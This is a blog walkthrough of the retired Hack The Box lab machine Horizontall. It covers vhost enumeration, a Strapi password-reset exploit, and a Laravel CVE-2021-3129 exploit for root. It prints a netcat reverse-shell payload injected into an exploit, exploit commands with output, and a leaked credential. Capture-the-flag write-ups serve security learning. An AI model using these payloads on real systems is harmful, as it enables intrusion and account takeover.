---
layout: single
title: "Walktrough: HTB Horizontall"
namespace: htb-horizontall
category: Walkthrough
tags:
  - HackTheBox
  - HTB Easy
  - HTB Linux
date: 2021-07-03 16:00:00
header:
   teaser: https://i.imgur.com/T9F3vYj.png
---

Hello guys!

This week's machine will be **Horizontall**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [Micah](https://app.hackthebox.eu/users/22435). <!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Horizontall](https://i.imgur.com/ruq2KM8.png){: .align-center}

add **Comment**!

## Enumeration

As usual, started a quick `nmap` scan in order to identify published services in this box

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.11.105
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 20:30 -03
Nmap scan report for 10.10.11.105
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.15 seconds
```

As we can see in the enumeration, the website is redirecting on port 80/TCP to DNS `horizontall.htb`, which was later added to the local hosts file.

After completion ran also two other scans, which returned nothing different than we already had:

```bash
# Quick UDP Scan
sudo nmap -sU -sV -vv -oA quick_udp 10.10.11.105
# TCP All Ports
nmap -p- -Pn -oA allPorts 10.10.11.105
```

### 80/TCP - HTTP Service

Accessing the page with a browser, we can see a website, the only difference from what we normally see over there is that this website is completely created using JavaScript. So nothing is shown using `curl` or other tools.

![HTB Horizontall - HTTP Website](https://i.imgur.com/4CYplRP.png){: .align-center}

Inspecting the rendered page using grep, looking for references, found nothing interesting, besides an HTTPS entry for this same page, not listening (at least not publicly)

```bash
$ grep -Eo 'href=".*"|src=".*"' tmp | awk -F" " '{print $1}' | awk -F"\"" '{print $2}' | sort -u
#
/
/css/app.0f40a091.css
/css/chunk-vendors.55204a1e.css
/favicon.ico
https://horizontall.htb
/img/c1.2d2dcf21.jpg
/img/c2.0a3b2b89.jpg
/img/c3.1a5adf9b.jpg
/img/coding_.e8413cbf.svg
/img/email_campaign_monochromatic.f0faa6a4.svg
/img/handshake.34250d54.svg
/img/horizontall.2db2bc37.png
/img/marketing.4b7dfec0.svg
/img/revenue_.71587b74.svg
/img/seo_monochromatic.5fce4827.svg
/js/app.c68eb462.js
/js/chunk-vendors.0e02b89e.js
```

Did a brute-forcing using `gobuster`, starting with `dir` mode, and nothing interesting was returned, besides the references already seen in the links above

```bash
$ gobuster dir -u http://horizontall.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ./gobuster.txt -x html,txt,php -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/01/11 12:18:20 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 901]
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
Progress: 870951 / 882244 (98.71%)
```

Also, tried `dns` enumeration, but nothing was returned as well.

```bash
$ gobuster dns -d horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster-dns.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     horizontall.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
2022/01/11 12:33:36 Starting gobuster in DNS enumeration mode
===============================================================

===============================================================
2022/01/11 12:40:48 Finished
===============================================================
```

Once I got stuck, started reviewing all enumeration done so far as well as some tips on the internet about webservice recon, one detail that I was missing is that DNS and VHOST brute forces are two different things in `gobuster`.

- In **DNS** mode, `gobuster` will make a DNS lookup based on the wordlist provided. This scenario might be useful in some cases but for this box, nothing will be ever resolved using DNS.
- Meanwhile, **VHOST** mode works differently: It takes a known URL Server and crafts a request probing for existing virtual hosts in the same web server, which in this case gave us a path to follow :smile:

```bash
$ gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/01/11 12:24:10 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]

===============================================================
2022/01/11 12:27:19 Finished
===============================================================
```

After adding `api-prod.horizontall.htb` to `/etc/hosts`, made a simple request using curl and we can see the output below

```bash
$ curl -L http://api-prod.horizontall.htb
<!doctype html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Welcome to your API</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
    </style>
  </head>
  <body lang="en">
    <section>
      <div class="wrapper">
        <h1>Welcome.</h1>
      </div>
    </section>
  </body>
</html>
```

Once APIs relies on subdirectories, to determine which operations we could be able to execute here, started `gobuster dir` enumeration to the recently found vhost, and the following results

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/01/11 12:55:27 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 413]
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
/admin                (Status: 200) [Size: 854]
/Reviews              (Status: 200) [Size: 507]
/robots.txt           (Status: 200) [Size: 121]
/Users                (Status: 403) [Size: 60]
/Admin                (Status: 200) [Size: 854]
/REVIEWS              (Status: 200) [Size: 507]
Progress: 212376 / 882244 (24.07%)
```

Starting by the `robots.txt` file, nothing interesting was found, and navigating to `/admin`, found a page for **strapi** Login

![HTB Horizontall - strapi Login Page](https://i.imgur.com/elvyAQG.png){: .align-center}

Searching for this product in Exploit-DB's `searchsploit`, found some entries for 3.0.0 beta versions, that could allow us to take over accounts in an unauthenticated way and, based on this account, get remote code execution on the server.

```bash
$ searchsploit strapi
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                    | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)  | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthentic | multiple/webapps/50239.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Initial Access & User Flag

In order to obtain a legitimate access to the web server, we need an existing account to set its password, so we can try exploit `multiple/webapps/50237.py`. Poking with the API, besides the `/admin`, we have two other paths, already listed by gobuster: **users** and **reviews**.

While `users` requires authentication, we can list  reviews from this API, which give us 3 accounts: **wail**, **doe** and **john**.

```bash
$ curl -L http://api-prod.horizontall.htb/reviews | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   507  100   507    0     0   1813      0 --:--:-- --:--:-- --:--:--  1817
[
  {
    "id": 1,
    "name": "wail",
    "description": "This is good service",
    "stars": 4,
    "created_at": "2021-05-29T13:23:38.000Z",
    "updated_at": "2021-05-29T13:23:38.000Z"
  },
  {
    "id": 2,
    "name": "doe",
    "description": "i'm satisfied with the product",
    "stars": 5,
    "created_at": "2021-05-29T13:24:17.000Z",
    "updated_at": "2021-05-29T13:24:17.000Z"
  },
  {
    "id": 3,
    "name": "john",
    "description": "create service with minimum price i hop i can buy more in the futur",
    "stars": 5,
    "created_at": "2021-05-29T13:25:26.000Z",
    "updated_at": "2021-05-29T13:25:26.000Z"
  }
]
```

when started editing exploit 50237, noticed that it requires an e-mail address and not the username, which was failing when I tried to reset the password but, debugging calls, noticed that in one of the retuned outputs mentions **admin@horizontall.htb**, which is the administrator of the API.

```python
>>> exploit={"code":{}, "password":newPassword, "passwordConfirmation":newPassword}
>>> r=s.post("{}/admin/auth/reset-password".format(strapiUrl), json=exploit)
>>> r.content
b'{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxOTE4ODAzLCJleHAiOjE2NDQ1MTA4MDN9.X-RiBkUxmOsLCfEWaYuYAnCJGWFqYnpMs6qUdb5-4_8","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}'
```

edited script and reexecuted call, as output below, was able to log in to the administration portal using **admin:P@ssword**

```bash
$ python 50237.py
[*] strapi version: 3.0.0-beta.17.4
[*] Password reset for user: admin@horizontall.htb
[*] Setting new password
[+] New password 'P@ssw0rd' set for user admin@horizontall.htb
```

![HTB Horizontall - strapi Admin Panel](https://i.imgur.com/IGt9hHs.png){: .align-center}

Now with active access to the tool, we can use exploit 50238, which requires a JWT token, which was collected from the sign-in request in Burp Suite History.

Verifying the scirpt, I have noticed that it executes commands and then forward the output to local host. To make easier to use it, have edited the file on the following lines, allowing me to get an interactive shell

```python
postData = {
    "plugin": "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f)" % (lhost, lport)
}
```

Checking strapi permissions, noticed taht this user is able to read contents of user **developer**, which is the directory where `user.txt` file is located. Gave it a try and was able to read the user flag

```bash
$ cat /home/developer/user.txt
<redacted>
```

## Root Flag

After submitting the user flag, started to enumerate box for root rights. As usual, started by checking application credentials so we could harvest other credentials to be reused but, with the password obtained for user **developer:#J!:F9Zt2u** via strapi development instance (/opt/strapi/myapi/config/environments/development/database.json), just contained admin@horizontall.htb credentails

Reviewing other services in this box, noticed a application running on 8000/TCP, which was confirmed by a simple `curl` command, presenting itself as a **Laravel v8 (PHP v7.4.18)**.

As we can't use browser in this session, have configured a private key in this box in order to tunnel traffic to 8000/TCP from attacker machine, done by following steps

- created a new ssh-key using `ssh-keygen`
- created a folder **.ssh** ** ~ (`/opt/strapi/`) and pasted contents from `id_rsa.pub` to `authorized_keys` file
- after that, connected using the command `ssh -i id_rsa strapi@horizontall.htb -L 8000:127.0.0.1:8000`, which redirects traffic from local machine at port 8000 to 8000 at destination host, displaying to us the following page

![HTB Horizontall - Laravel page](https://i.imgur.com/XwW7RxT.png){: .align-center}

After some research, came across this page at [Laravel - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/laravel), that mentions CVE-2021-3129, which can allow us get root on this box if this version running is `<= 8.4.2`

In order to test it, downloaded exploit from [GitHub - nth347/CVE-2021-3129_exploit: Exploit for CVE-2021-3129](https://github.com/nth347/CVE-2021-3129_exploit) and luckly was able to confirm that exploit worked properly

```bash
$ ./exploit.py http://127.0.0.1:8000 Monolog/RCE1 whoami                                                                         
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 2776, done.
remote: Counting objects: 100% (1118/1118), done.
remote: Compressing objects: 100% (640/640), done.
remote: Total 2776 (delta 459), reused 955 (delta 334), pack-reused 1658
Receiving objects: 100% (2776/2776), 412.30 KiB | 2.77 MiB/s, done.
Resolving deltas: 100% (1101/1101), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited
```

In the second attempt, changed command to span a reverse shell to attacker machine

```bash
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.16.13] from (UNKNOWN) [10.10.11.105] 39176
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
<redacted>      
```

I hope you guys have enjoyed it!

See you in the next post! :smile:
